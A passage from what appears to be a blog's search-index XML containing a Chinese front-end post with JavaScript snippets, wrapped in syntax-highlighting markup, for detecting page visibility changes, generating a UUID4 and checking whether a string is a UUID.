string">'webkitHidden'</span> <span class="token operator">:</span> <span class="token string">'mozHidden'</span> <span class="token keyword">in</span> document <span class="token operator">?</span> <span class="token string">'mozHidden'</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token keyword">const</span> visibilityChangeEvent <span class="token operator">=</span> hiddenProperty<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">hidden</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">,</span> <span class="token string">'visibilitychange'</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token function-variable function">onVisibilityChange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">[</span>hiddenProperty<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'页面非激活'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'页面激活'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>visibilityChangeEvent<span class="token punctuation">,</span> onVisibilityChange<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="生成UUID4"><a href="#生成UUID4" class="headerlink" title="生成UUID4"></a>生成UUID4</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">uuid4</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token string">'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[xy]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">c</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> r <span class="token operator">=</span> <span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0</span>    <span class="token keyword">const</span> v <span class="token operator">=</span> c <span class="token operator">===</span> <span class="token string">'x'</span> <span class="token operator">?</span> r <span class="token operator">:</span> <span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">0x3</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x8</span>    <span class="token keyword">return</span> v<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="判断是否是UUID"><a href="#判断是否是UUID" class="headerlink" title="判断是否是UUID"></a>判断是否是UUID</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">isUUID</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[0-9a-f]&#123;8&#125;-[0-9a-f]&#123;4&#125;-[0-9a-f]&#123;4&#125;-[0-9a-f]&#123;4&#125;-[0-9a-f]&#123;12&#125;$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> front-end </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
